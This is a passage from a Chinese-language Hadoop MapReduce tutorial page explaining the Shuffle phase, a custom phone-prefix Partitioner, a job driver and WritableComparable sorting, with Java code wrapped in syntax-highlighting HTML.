spellcheck="true">//开始排序阶段，Shuffle第152行</span>    sortPhase<span class="token punctuation">.</span><span class="token function">complete</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//排序阶段完成，即将进入reduce阶段 reduceTask382行</span><span class="token function">reduce</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//reduce阶段调用的就是我们自定义的reduce方法，会被调用多次</span>    <span class="token function">cleanup</span><span class="token punctuation">(</span>context<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//reduce完成之前，会最后调用一次Reducer里面的cleanup方法</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="3-Shuffle机制"><a href="#3-Shuffle机制" class="headerlink" title="3 Shuffle机制"></a>3 Shuffle机制</h1><h2 id="3-1-Shuffle机制"><a href="#3-1-Shuffle机制" class="headerlink" title="3.1 Shuffle机制"></a>3.1 Shuffle机制</h2><p>Map方法之后，Reduce方法之前的数据处理过程称之为Shuffle。</p><p>   <img src="/2020/11/12/bigdata-mapreduce2-framework/1638353745842.png" alt="1638353745842"></p><h2 id="3-2-Partition分区"><a href="#3-2-Partition分区" class="headerlink" title="3.2 Partition分区"></a>3.2 Partition分区</h2><p>  <img src="/2020/11/12/bigdata-mapreduce2-framework/1638353755493.png" alt="1638353755493"></p><p><img src="/2020/11/12/bigdata-mapreduce2-framework/1638353813686.png" alt="1638353813686"></p><p><img src="/2020/11/12/bigdata-mapreduce2-framework/1638353821140.png" alt="1638353821140"></p><h2 id="3-3-Partition分区案例实操"><a href="#3-3-Partition分区案例实操" class="headerlink" title="3.3 Partition分区案例实操"></a>3.3 Partition分区案例实操</h2><p><strong>1）需求</strong><br>将统计结果按照手机归属地不同省份输出到不同文件中（分区）<br>（1）输入数据</p><p>（2）期望输出数据<br>    手机号136、137、138、139开头都分别放到一个独立的4个文件中，其他开头的放到一个文件中。<br><strong>2）需求分析</strong></p><p><img src="/2020/11/12/bigdata-mapreduce2-framework/1638353840886.png" alt="1638353840886"></p><p><strong>3）在案例2.4的基础上，增加一个分区类</strong></p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>atguigu<span class="token punctuation">.</span>mapreduce<span class="token punctuation">.</span>flowsum<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>hadoop<span class="token punctuation">.</span>io<span class="token punctuation">.</span>Text<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>hadoop<span class="token punctuation">.</span>mapreduce<span class="token punctuation">.</span>Partitioner<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ProvincePartitioner</span> <span class="token keyword">extends</span> <span class="token class-name">Partitioner</span><span class="token operator">&lt;</span>Text<span class="token punctuation">,</span> FlowBean<span class="token operator">></span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">getPartition</span><span class="token punctuation">(</span>Text key<span class="token punctuation">,</span> FlowBean value<span class="token punctuation">,</span> <span class="token keyword">int</span> numPartitions<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 1 获取电话号码的前三位</span>        String preNum <span class="token operator">=</span> key<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> partition <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 2 判断是哪个省</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"136"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>preNum<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>            partition <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"137"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>preNum<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>            partition <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"138"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>preNum<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>            partition <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"139"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>preNum<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>            partition <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> partition<span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>4）在驱动函数中增加自定义数据分区设置和ReduceTask设置</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>atguigu<span class="token punctuation">.</span>mapreduce<span class="token punctuation">.</span>flowsum<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>IOException<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>hadoop<span class="token punctuation">.</span>conf<span class="token punctuation">.</span>Configuration<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>hadoop<span class="token punctuation">.</span>fs<span class="token punctuation">.</span>Path<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>hadoop<span class="token punctuation">.</span>io<span class="token punctuation">.</span>Text<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>hadoop<span class="token punctuation">.</span>mapreduce<span class="token punctuation">.</span>Job<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>hadoop<span class="token punctuation">.</span>mapreduce<span class="token punctuation">.</span>lib<span class="token punctuation">.</span>input<span class="token punctuation">.</span>FileInputFormat<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>hadoop<span class="token punctuation">.</span>mapreduce<span class="token punctuation">.</span>lib<span class="token punctuation">.</span>output<span class="token punctuation">.</span>FileOutputFormat<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">FlowsumDriver</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> IllegalArgumentException<span class="token punctuation">,</span> IOException<span class="token punctuation">,</span> ClassNotFoundException<span class="token punctuation">,</span> InterruptedException <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 输入输出路径需要根据自己电脑上实际的输入输出路径设置</span>        args <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span><span class="token string">"e:/output1"</span><span class="token punctuation">,</span><span class="token string">"e:/output2"</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 1 获取配置信息，或者job对象实例</span>        Configuration configuration <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Configuration</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Job job <span class="token operator">=</span> Job<span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span>configuration<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 2 指定本程序的jar包所在的本地路径</span>        job<span class="token punctuation">.</span><span class="token function">setJarByClass</span><span class="token punctuation">(</span>FlowsumDriver<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 3 指定本业务job要使用的mapper/Reducer业务类</span>        job<span class="token punctuation">.</span><span class="token function">setMapperClass</span><span class="token punctuation">(</span>FlowCountMapper<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        job<span class="token punctuation">.</span><span class="token function">setReducerClass</span><span class="token punctuation">(</span>FlowCountReducer<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 4 指定mapper输出数据的kv类型</span>        job<span class="token punctuation">.</span><span class="token function">setMapOutputKeyClass</span><span class="token punctuation">(</span>Text<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        job<span class="token punctuation">.</span><span class="token function">setMapOutputValueClass</span><span class="token punctuation">(</span>FlowBean<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 5 指定最终输出的数据的kv类型</span>        job<span class="token punctuation">.</span><span class="token function">setOutputKeyClass</span><span class="token punctuation">(</span>Text<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        job<span class="token punctuation">.</span><span class="token function">setOutputValueClass</span><span class="token punctuation">(</span>FlowBean<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 8 指定自定义数据分区</span>        job<span class="token punctuation">.</span><span class="token function">setPartitionerClass</span><span class="token punctuation">(</span>ProvincePartitioner<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 9 同时指定相应数量的reduce task</span>        job<span class="token punctuation">.</span><span class="token function">setNumReduceTasks</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 6 指定job的输入原始文件所在目录</span>        FileInputFormat<span class="token punctuation">.</span><span class="token function">setInputPaths</span><span class="token punctuation">(</span>job<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Path</span><span class="token punctuation">(</span>args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        FileOutputFormat<span class="token punctuation">.</span><span class="token function">setOutputPath</span><span class="token punctuation">(</span>job<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Path</span><span class="token punctuation">(</span>args<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 7 将job中配置的相关参数，以及job所用的java类所在的jar包， 提交给yarn去运行</span>        <span class="token keyword">boolean</span> result <span class="token operator">=</span> job<span class="token punctuation">.</span><span class="token function">waitForCompletion</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span><span class="token function">exit</span><span class="token punctuation">(</span>result <span class="token operator">?</span> <span class="token number">0</span> <span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3-4-WritableComparable排序"><a href="#3-4-WritableComparable排序" class="headerlink" title="3.4 WritableComparable排序"></a>3.4 WritableComparable排序</h2><p>排序是MapReduce框架中最重要的操作之一。MapTask和ReduceTask均会对数据按照key进行排序。该操作属于hadoop的默认行为。任何应用程序中的数据均会被排序，而不管逻辑上是否需要。</p><p><strong>默认排序是按照字典顺序排序，且实现该排序的方法是快速排序。</strong></p><p>对于MapTask，它会将处理的结果暂时放到环形缓冲区中，<strong>当环形缓冲区使用率达到一定阈值厚，再对缓冲区中的数据进行一次快速排序，并将这些有序数据溢写到磁盘上</strong>，而当数据处理完毕后，它会对磁盘上所有文<strong>件进行归并排序</strong>。</p><p>对于ReduceTask，它从每个MapTask上原创拷贝相应的数据文件，如果文件大小超过一定阈值，则溢写磁盘上，否则存储到内存中。如果磁盘上文件数目达到一定阈值，则进行一次归排序以生产一个更大的文件；如果内存中文件大小或者数目超过一定阈值，则进行一次合并后将数据溢写到磁盘上。当所有数据拷贝完毕后，<strong>ReduceTask统一对内存和磁盘上的所有数据进行一次归并排序</strong>。</p><p> 自定义排序WritableComparable原理分析</p><p>bean对象做为key传输，需要实现WritableComparable接口重写compareTo方法，就可以实现排序。</p><pre class="line-numbers language-java"><code class="language-java"><span class="token annotation punctuation">@Override</span><span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">compareTo</span><span class="token punctuation">(</span>FlowBean bean<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>  <span class="token keyword">int</span> result<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// 按照总流量大小，倒序排列</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>sumFlow <span class="token operator">></span> bean<span class="token punctuation">.</span><span class="token function">getSumFlow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>​    result <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>  <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>sumFlow <span class="token operator">&lt;</span> bean<span class="token punctuation">.</span><span class="token function">getSumFlow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>​    result <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>  <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token keyword">else</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>​    result <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3-5-WritableComparable排序案例实操（全排序）"><a href="#3-5-WritableComparable排序案例实操（全排序）" class="headerlink" title="3.5 WritableComparable排序案例实操（全排序）"></a>3.5 WritableComparable排序案例实操（全排序）</h2><p>1）需求<br>根据案例2.3序列化案例产生的结果再次对总流量进行倒序排序。<br>（1）输入数据<br>原始数据                          第一次处理后的数据</p><p>（2）期望输出数据<br>13509468723    7335    110349    117684<br>13736230513    2481    24681    27162<br>13956435636    132        1512    1644<br>13846544121    264        0        264<br>。。。 。。。<br>2）需求分析</p><p><img src="/2020/11/12/bigdata-mapreduce2-framework/1638354454570.png" alt="1638354454570"></p><p>3）代码实现<br>（1）FlowBean对象在在需求1基础上增加了比较功能</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>atguigu<span class="token punctuation">.</span>mapreduce<span class="token punctuation">.</span>sort<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>DataInput<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>DataOutput<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>IOException<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>hadoop<span class="token punctuation">.</span>io<span class="token punctuation">.</span>WritableComparable<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">FlowBean</span> <span class="token keyword">implements</span> <span class="token class-name">WritableComparable</span><span class="token operator">&lt;</span>FlowBean<span class="token operator">></span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">long</span> upFlow<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">long</span> downFlow<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">long</span> sumFlow<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 反序列化时，需要反射调用空参构造函数，所以必须有</span>    <span class="token keyword">public</span> <span class="token function">FlowBean</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        <span class="token keyword">super</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token function">FlowBean</span><span class="token punctuation">(</span><span class="token keyword">long</span> upFlow<span class="token punctuation">,</span> <span class="token keyword">long</span> downFlow<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        <span class="token keyword">super</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>upFlow <span class="token operator">=</span> upFlow<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>downFlow <span class="token operator">=</span> downFlow<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>sumFlow <span class="token operator">=</span> upFlow <span class="token operator">+</span> downFlow<span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">set</span><span class="token punctuation">(</span><span class="token keyword">long</span> upFlow<span class="token punctuation">,</span> <span class="token keyword">long</span> downFlow<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>upFlow <span class="token operator">=</span> upFlow<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>downFlow <span class="token operator">=</span> downFlow<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>sumFlow <span class="token operator">=</span> upFlow <span class="token operator">+</span> downFlow<span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">long</span> <span class="token function">getSumFlow</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> sumFlow<span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setSumFlow</span><span class="token punctuation">(</span><span class="token keyword">long</span> sumFlow<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>sumFlow <span class="token operator">=</span> sumFlow<span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">long</span> <span class="token function">getUpFlow</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> upFlow<span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setUpFlow</span><span class="token punctuation">(</span><span class="token keyword">long</span> upFlow<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>upFlow <span class="token operator">=</span> upFlow<span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">long</span> <span class="token function">getDownFlow</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> downFlow<span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setDownFlow</span><span class="token punctuation">(</span><span class="token keyword">long</span> downFlow<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>downFlow <span class="token operator">=</span> downFlow<span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/**     * 序列化方法     * @param out     * @throws IOException     */</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">write</span><span class="token punctuation">(</span>DataOutput out<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        out<span class="token punctuation">.</span><span class="token function">writeLong</span><span class="token punctuation">(</span>upFlow<span class="token punctuation">)</span><span class="token punctuation">;</span>        out<span class="token punctuation">.</span><span class="token function">writeLong</span><span class="token punctuation">(</span>downFlow<span class="token punctuation">)</span><span class="token punctuation">;</span>        out<span class="token punctuation">.</span><span class="token function">writeLong</span><span class="token punctuation">(</span>sumFlow<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/**     * 反序列化方法 注意反序列化的顺序和序列化的顺序完全一致     * @param in     * @throws IOException     */</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">readFields</span><span class="token punctuation">(</span>DataInput in<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        upFlow <span class="token operator">=</span> in<span class="token punctuation">.</span><span class="token function">readLong</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        downFlow <span class="token operator">=</span> in<span class="token punctuation">.</span><span class="token function">readLong</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        sumFlow <span class="token operator">=</span> in<span class="token punctuation">.</span><span class="token function">readLong</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> String <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> upFlow <span class="token operator">+</span> <span class="token string">"\t"</span> <span class="token operator">+</span> downFlow <span class="token operator">+</span> <span class="token string">"\t"</span> <span class="token operator">+</span> sumFlow<span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">compareTo</span><span class="token punctuation">(</span>FlowBean bean<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> result<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 按照总流量大小，倒序排列</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>sumFlow <span class="token operator">></span> bean<span class="token punctuation">.</span><span class="token function">getSumFlow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>            result <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>sumFlow <span class="token operator">&lt;</span> bean<span class="token punctuation">.</span><span class="token function">getSumFlow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>            result <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token keyword">else</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>            result <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> result<span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>（2）编写Mapper类</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>atguigu<span class="token punctuation">.</span>mapreduce<span class="token punctuation">.</span>sort<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>IOException<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>hadoop<span class="token punctuation">.</span>io<span class="token punctuation">.</span>LongWritable<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token 